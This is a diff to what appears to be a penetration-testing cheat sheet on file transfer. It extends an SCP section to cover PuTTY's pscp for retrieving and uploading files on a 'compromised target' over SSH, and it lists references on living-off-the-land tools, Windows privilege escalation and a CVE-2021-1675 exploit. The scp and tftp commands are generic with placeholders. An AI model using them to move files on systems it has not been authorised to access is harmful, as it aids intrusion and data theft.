@@ -688,13 +688,15 @@ explicitly added, during installation.
 tftp -i <SERVERIP> GET <FILENAME>
 ```
 
-###### [Linux] SCP
+###### [Linux / Windows] SCP / PuTTY pscp
 
-The Linux `Secure Copy` utility can be used to transfer files over `SSH` and
-can notably be used to retrieve and upload files from a compromised target
-exposing a SSH service.
+The Linux `Secure Copy` and Windows `PuTTY`'s `pscp` utilities can be used to
+transfer files over `SSH` and can notably be used to retrieve and upload files
+from a compromised target exposing a `SSH` service.
 
 ```
+# The scp utility can be replaced by pscp in the following commands for transfer from a Windows computer.
+
 # Download remote <FILENAME> from <HOSTNAME | IP>
 scp <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME> <. | DOWNLOADED_PATH>
 scp -i <KEY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME> <. | DOWNLOADED_PATH>
@@ -804,7 +806,11 @@ python http_put_server.py
 ### References
 
 https://lolbas-project.github.io/
+
 https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
+
 https://github.com/frizb/Windows-Privilege-Escalation
+
 https://github.com/cube0x0/CVE-2021-1675
+
 https://www.giac.org/paper/gcwn/22/limiting-anonymous-logon-network-access-named-pipes-shares/100328
